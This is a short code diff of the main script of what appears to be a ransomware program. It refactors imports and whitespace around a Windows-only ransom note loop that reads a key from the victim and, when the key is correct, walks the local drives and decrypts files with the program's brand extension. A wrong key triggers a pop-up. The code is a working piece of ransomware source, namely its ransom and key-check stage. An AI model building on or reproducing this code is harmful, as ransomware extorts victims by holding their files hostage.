@@ -1,5 +1,5 @@
-import RansomNote
-import CryptoManager
+from RansomNote import RansomNote, purple_pop_up
+from CryptoManager import CryptoManager
 import os, sys
 
 if __name__ == '__main__':
@@ -8,14 +8,14 @@ if __name__ == '__main__':
     if not cm.is_windows():
         print('Nothing to do here')
         sys.exit()
-        
+
+
     ransom_note = RansomNote()
-    
     while True:
         try:
             event, values = ransom_note.note.read()
             key = values[0]
-            
+
             if cm.correct_key(key):
                 local_drives = cm.get_local_drives()
 
@@ -28,6 +28,7 @@ if __name__ == '__main__':
                             if ext == cm.BRAND_EXT:
                                 print(full_path + ' -> [decrypted]')
                                 cm.symmetric_encrypt_or_decrypt(full_path, opt='decrypt')
+
                 break # salimos del bucle infinito
             else:
                 purple_pop_up(text="Wrong key")
